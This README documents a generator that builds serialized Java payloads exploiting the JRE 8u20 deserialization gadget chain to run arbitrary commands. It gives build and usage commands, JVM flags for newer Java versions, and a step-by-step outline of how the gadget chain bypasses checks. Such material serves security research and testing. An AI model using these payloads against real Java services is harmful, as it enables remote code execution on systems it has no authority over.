# JRE 8u20 RCE Exploit Generator

Generator for the JRE 8u20 deserialization RCE gadget (CVE-2014-6593). This gadget exploits a vulnerability in `java.beans.beancontext.BeanContextSupport` and `sun.reflect.annotation.AnnotationInvocationHandler` to achieve code execution without requiring any third-party libraries (pure JDK).

## Requirements

- Java 8
- Maven 3.x

## Build

```bash
mvn clean package
```

The executable JAR will be created at `target/JRE8Exploit-1.0-SNAPSHOT.jar`.

## Usage

Generate a serialized payload that executes a specific command:

```bash
java -jar target/JRE8Exploit-1.0-SNAPSHOT.jar "open /System/Applications/Calculator.app"
```

### Note for Java 9+ users
If you encounter `IllegalAccessError`, you need to open internal modules:

```bash
java --add-opens java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
     --add-opens java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
     --add-opens java.base/sun.reflect.annotation=ALL-UNNAMED \
     --add-opens java.base/java.util=ALL-UNNAMED \
     -jar target/JRE8Exploit-1.0-SNAPSHOT.jar "command"
```

This will create a file named `exploit.ser` in the current directory.

## Implementation Details

The exploit works by:
1.  Creating a malicious `TemplatesImpl` object containing bytecode that executes the command.
2.  Creating a `LinkedHashSet` (to enforce order).
3.  Adding the `TemplatesImpl` and a dynamic Proxy to the set.
4.  Using `AnnotationInvocationHandler` to trigger an exception during deserialization of the Proxy chain.
5.  This exception allows bypassing standard checks and reaching the payload trigger.
6.  The serialization stream is manually constructed and patched to ensure precise object references.

**Note**: This exploit is specific to JRE 8u20. Newer versions patched `AnnotationInvocationHandler`.
